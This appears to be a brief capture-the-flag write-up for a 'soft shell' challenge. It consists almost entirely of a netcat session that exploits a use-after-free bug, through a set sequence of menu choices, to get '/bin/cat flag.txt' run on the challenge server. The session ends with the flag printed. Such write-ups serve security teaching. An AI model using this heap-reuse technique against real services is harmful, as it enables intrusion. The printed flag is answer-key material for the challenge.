@@ -1,0 +1,76 @@
+Use after free vulnerability
+```
+$ nc chal.pctf.competitivecyber.club 8888
+               __ _       _          _ _ 
+              / _| |     | |        | | |
+    ___  ___ | |_| |_ ___| |__   ___| | |
+   / __|/ _ \|  _| __/ __| '_ \ / _ \ | |
+   \__ \ (_) | | | |_\__ \ | | |  __/ | |
+   |___/\___/|_|  \__|___/_| |_|\___|_|_|
+
+
+     The c shell that can't do anything!
+          (Please don't try to)
+
+
+1) Add command
+2) View command
+3) Edit tag
+4) Run command
+5) Remove argument
+Choose an option >> 1
+
+Command to add >> /usr/games/cowsay moooo
+Command added at index 0
+Tag for command >> 0
+
+1) Add command
+2) View command
+3) Edit tag
+4) Run command
+5) Remove argument
+Choose an option >> 5
+
+Index of command to remove arg >> 0
+
+1) Add command
+2) View command
+3) Edit tag
+4) Run command
+5) Remove argument
+Choose an option >> 1
+
+Command to add >> flag.txt
+Command added at index 1
+Tag for command >> 1
+
+1) Add command
+2) View command
+3) Edit tag
+4) Run command
+5) Remove argument
+Choose an option >> 5
+
+Index of command to remove arg >> 0
+
+1) Add command
+2) View command
+3) Edit tag
+4) Run command
+5) Remove argument
+Choose an option >> 1
+
+Command to add >> /bin/cat
+Command added at index 2
+Tag for command >> 2
+
+1) Add command
+2) View command
+3) Edit tag
+4) Run command
+5) Remove argument
+Choose an option >> 4
+
+Index of command to run >> 0
+PCTF{l1nk3d_h34p_g035_b00m_3275259}
+```
